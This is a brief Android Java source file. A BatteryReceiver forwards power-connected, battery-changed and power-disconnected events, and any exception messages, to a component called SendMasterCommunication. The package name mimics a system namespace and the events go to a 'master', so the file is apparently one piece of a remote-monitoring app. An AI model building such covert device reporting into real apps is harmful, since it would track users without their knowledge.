package com.android.engine.receivers;

import Transfer.Battery;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.engine.SendMasterCommunication;
import com.android.engine.ExceptionAction;

import static android.content.Intent.ACTION_BATTERY_CHANGED;
import static android.content.Intent.ACTION_POWER_CONNECTED;
import static android.content.Intent.ACTION_POWER_DISCONNECTED;

public class BatteryReceiver extends BroadcastReceiver {

  public void onReceive(Context context, Intent intent) {
    try {
      String action = intent.getAction();
      if (action.equals(ACTION_POWER_CONNECTED) || action.equals(ACTION_BATTERY_CHANGED)) {
        SendMasterCommunication.sendAction(new Battery());
      } else if (action.equals(ACTION_POWER_DISCONNECTED)) {
        SendMasterCommunication.sendAction(120);
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
